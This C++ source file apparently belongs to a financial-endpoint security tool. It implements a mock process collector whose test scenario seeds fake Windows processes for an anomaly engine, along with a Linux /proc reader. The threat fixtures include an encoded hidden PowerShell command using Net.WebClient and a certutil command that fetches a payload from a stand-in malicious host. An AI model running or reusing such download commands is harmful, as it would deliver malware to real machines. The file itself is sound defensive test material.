#include "finguard/hal/mock_collector.hpp"
#include "finguard/hal/win32_collector.hpp"
#include <fstream>
#include <filesystem>
#include <sstream>

namespace finguard::hal {

MockCollector::MockCollector() {
    load_default_threat_scenario();
}

std::vector<ProcessInfo> MockCollector::enumerate_processes() {
    std::lock_guard<std::mutex> lock(mutex_);
    std::vector<ProcessInfo> list;
    list.reserve(processes_.size());
    for (const auto& [pid, proc] : processes_) {
        list.push_back(proc);
    }
    return list;
}

std::optional<ProcessInfo> MockCollector::get_process_by_pid(uint32_t pid) {
    std::lock_guard<std::mutex> lock(mutex_);
    auto it = processes_.find(pid);
    if (it != processes_.end()) {
        return it->second;
    }
    return std::nullopt;
}

std::vector<ModuleInfo> MockCollector::get_loaded_modules(uint32_t pid) {
    std::lock_guard<std::mutex> lock(mutex_);
    auto it = processes_.find(pid);
    if (it != processes_.end()) {
        return it->second.loaded_modules;
    }
    return {};
}

std::vector<PrivilegeInfo> MockCollector::get_process_privileges(uint32_t pid) {
    std::lock_guard<std::mutex> lock(mutex_);
    auto it = processes_.find(pid);
    if (it != processes_.end()) {
        return it->second.privileges;
    }
    return {};
}

void MockCollector::add_process(ProcessInfo process) {
    std::lock_guard<std::mutex> lock(mutex_);
    processes_[process.pid] = std::move(process);
}

void MockCollector::clear_processes() {
    std::lock_guard<std::mutex> lock(mutex_);
    processes_.clear();
}

void MockCollector::set_modules(uint32_t pid, std::vector<ModuleInfo> modules) {
    std::lock_guard<std::mutex> lock(mutex_);
    auto it = processes_.find(pid);
    if (it != processes_.end()) {
        it->second.loaded_modules = std::move(modules);
    }
}

void MockCollector::set_privileges(uint32_t pid, std::vector<PrivilegeInfo> privs) {
    std::lock_guard<std::mutex> lock(mutex_);
    auto it = processes_.find(pid);
    if (it != processes_.end()) {
        it->second.privileges = std::move(privs);
    }
}

void MockCollector::load_default_threat_scenario() {
    std::lock_guard<std::mutex> lock(mutex_);
    processes_.clear();

    // 1. System Idle & Kernel
    {
        ProcessInfo p;
        p.pid = 4;
        p.ppid = 0;
        p.name = "System";
        p.executable_path = "ntoskrnl.exe";
        p.integrity_level = IntegrityLevel::System;
        p.is_elevated = true;
        processes_[p.pid] = p;
    }

    // 2. Authentic smss.exe
    {
        ProcessInfo p;
        p.pid = 380;
        p.ppid = 4;
        p.name = "smss.exe";
        p.executable_path = "C:\\Windows\\System32\\smss.exe";
        p.integrity_level = IntegrityLevel::System;
        p.is_elevated = true;
        processes_[p.pid] = p;
    }

    // 3. Authentic csrss.exe
    {
        ProcessInfo p;
        p.pid = 520;
        p.ppid = 380;
        p.name = "csrss.exe";
        p.executable_path = "C:\\Windows\\System32\\csrss.exe";
        p.integrity_level = IntegrityLevel::ProtectedProcess;
        p.is_elevated = true;
        processes_[p.pid] = p;
    }

    // 4. Authentic services.exe
    {
        ProcessInfo p;
        p.pid = 612;
        p.ppid = 380;
        p.name = "services.exe";
        p.executable_path = "C:\\Windows\\System32\\services.exe";
        p.integrity_level = IntegrityLevel::System;
        p.is_elevated = true;
        processes_[p.pid] = p;
    }

    // 5. Authentic lsass.exe
    {
        ProcessInfo p;
        p.pid = 700;
        p.ppid = 612;
        p.name = "lsass.exe";
        p.executable_path = "C:\\Windows\\System32\\lsass.exe";
        p.integrity_level = IntegrityLevel::System;
        p.is_elevated = true;
        p.privileges.push_back({"SeDebugPrivilege", true, "Debug programs"});
        p.privileges.push_back({"SeTcbPrivilege", true, "Act as part of the operating system"});
        processes_[p.pid] = p;
    }

    // 6. Authentic svchost.exe (DcomLaunch)
    {
        ProcessInfo p;
        p.pid = 880;
        p.ppid = 612;
        p.name = "svchost.exe";
        p.executable_path = "C:\\Windows\\System32\\svchost.exe";
        p.command_line = "C:\\Windows\\System32\\svchost.exe -k DcomLaunch";
        p.integrity_level = IntegrityLevel::System;
        p.is_elevated = true;
        processes_[p.pid] = p;
    }

    // 7. Authentic explorer.exe
    {
        ProcessInfo p;
        p.pid = 1024;
        p.ppid = 880;
        p.name = "explorer.exe";
        p.executable_path = "C:\\Windows\\explorer.exe";
        p.integrity_level = IntegrityLevel::Medium;
        p.is_elevated = false;
        processes_[p.pid] = p;
    }

    // 8. Normal Chrome Browser
    {
        ProcessInfo p;
        p.pid = 3400;
        p.ppid = 1024;
        p.name = "chrome.exe";
        p.executable_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
        p.command_line = "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=Default";
        p.integrity_level = IntegrityLevel::Medium;
        processes_[p.pid] = p;
    }

    // 9. Legitimate Financial App: Telebirr Desktop
    {
        ProcessInfo p;
        p.pid = 3900;
        p.ppid = 1024;
        p.name = "telebirr.exe";
        p.executable_path = "C:\\Program Files\\EthioTelecom\\Telebirr\\telebirr.exe";
        p.integrity_level = IntegrityLevel::Medium;
        processes_[p.pid] = p;
    }

    // ==========================================
    // THREAT VECTORS FOR TESTING ANOMALY ENGINE
    // ==========================================

    // Threat Vector 1: Path Spoofing Impostor (svchost running from AppData)
    {
        ProcessInfo p;
        p.pid = 4112;
        p.ppid = 1024;
        p.name = "svchost.exe";
        p.executable_path = "C:\\Users\\Victim\\AppData\\Roaming\\svchost.exe";
        p.command_line = "C:\\Users\\Victim\\AppData\\Roaming\\svchost.exe --stealth";
        p.integrity_level = IntegrityLevel::Medium;
        processes_[p.pid] = p;
    }

    // Threat Vector 2: Word Spawning Hidden Base64 Encoded PowerShell (LOLBin + Lineage)
    {
        ProcessInfo p_parent;
        p_parent.pid = 4890;
        p_parent.ppid = 1024;
        p_parent.name = "WINWORD.EXE";
        p_parent.executable_path = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";
        p_parent.integrity_level = IntegrityLevel::Medium;
        processes_[p_parent.pid] = p_parent;

        ProcessInfo p_child;
        p_child.pid = 4894;
        p_child.ppid = 4890;
        p_child.name = "powershell.exe";
        p_child.executable_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        p_child.command_line = "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA... (New-Object Net.WebClient)";
        p_child.integrity_level = IntegrityLevel::Medium;
        processes_[p_child.pid] = p_child;
    }

    // Threat Vector 3: Certutil abuse downloading payload from suspicious URL
    {
        ProcessInfo p;
        p.pid = 5120;
        p.ppid = 4894;
        p.name = "certutil.exe";
        p.executable_path = "C:\\Windows\\System32\\certutil.exe";
        p.command_line = "certutil -urlcache -split -f http://evil-financial-stealer.xyz/payload.exe C:\\temp\\stealer.exe";
        p.integrity_level = IntegrityLevel::Medium;
        processes_[p.pid] = p;
    }

    // Threat Vector 4: Non-system process holding elevated SeDebugPrivilege (Memory Injection Risk)
    {
        ProcessInfo p;
        p.pid = 6200;
        p.ppid = 1024;
        p.name = "untrusted_injector.exe";
        p.executable_path = "C:\\Users\\Victim\\Downloads\\untrusted_injector.exe";
        p.integrity_level = IntegrityLevel::High;
        p.is_elevated = true;
        p.privileges.push_back({"SeDebugPrivilege", true, "Debug programs (Allows reading/writing other process memory)"});
        processes_[p.pid] = p;
    }

    // Threat Vector 5: Scenario B from Technical Report - UnknownApp.exe (PID 5500)
    // Simulates an unsigned, unknown publisher app making external connections and attempting process access
    {
        ProcessInfo p;
        p.pid = 5500;
        p.ppid = 1024;
        p.name = "UnknownApp.exe";
        p.executable_path = "C:\\Program Files\\UnknownApp\\UnknownApp.exe";
        p.command_line = "\"C:\\Program Files\\UnknownApp\\UnknownApp.exe\" --background";
        p.integrity_level = IntegrityLevel::Medium;
        p.is_elevated = false;
        processes_[p.pid] = p;
    }
}

void MockCollector::populate_from_linux_procfs() {
    std::lock_guard<std::mutex> lock(mutex_);
    processes_.clear();

    namespace fs = std::filesystem;
    if (!fs::exists("/proc")) return;

    for (const auto& entry : fs::directory_iterator("/proc")) {
        if (!entry.is_directory()) continue;
        std::string filename = entry.path().filename().string();
        if (filename.empty() || !std::isdigit(filename[0])) continue;

        uint32_t pid = static_cast<uint32_t>(std::stoul(filename));
        ProcessInfo info;
        info.pid = pid;

        // Read /proc/[pid]/comm
        std::ifstream comm_file(entry.path() / "comm");
        if (comm_file.is_open()) {
            std::getline(comm_file, info.name);
        }

        // Read /proc/[pid]/exe symlink
        try {
            if (fs::is_symlink(entry.path() / "exe")) {
                info.executable_path = fs::read_symlink(entry.path() / "exe").string();
            }
        } catch (...) {}

        // Read /proc/[pid]/cmdline
        std::ifstream cmd_file(entry.path() / "cmdline");
        if (cmd_file.is_open()) {
            std::string arg;
            while (std::getline(cmd_file, arg, '\0')) {
                if (!info.command_line.empty()) info.command_line += " ";
                info.command_line += arg;
            }
        }

        // Read /proc/[pid]/stat for PPID
        std::ifstream stat_file(entry.path() / "stat");
        if (stat_file.is_open()) {
            std::string token;
            int idx = 0;
            while (stat_file >> token) {
                if (idx == 3) { // 4th field is ppid
                    try {
                        info.ppid = static_cast<uint32_t>(std::stoul(token));
                    } catch (...) {}
                    break;
                }
                idx++;
            }
        }

        processes_[pid] = std::move(info);
    }
}

std::unique_ptr<PlatformCollector> create_default_collector() {
#ifdef _WIN32
    return std::make_unique<Win32Collector>();
#else
    // On Linux or during development, return MockCollector initialized with test scenario
    return std::make_unique<MockCollector>();
#endif
}

} // namespace finguard::hal
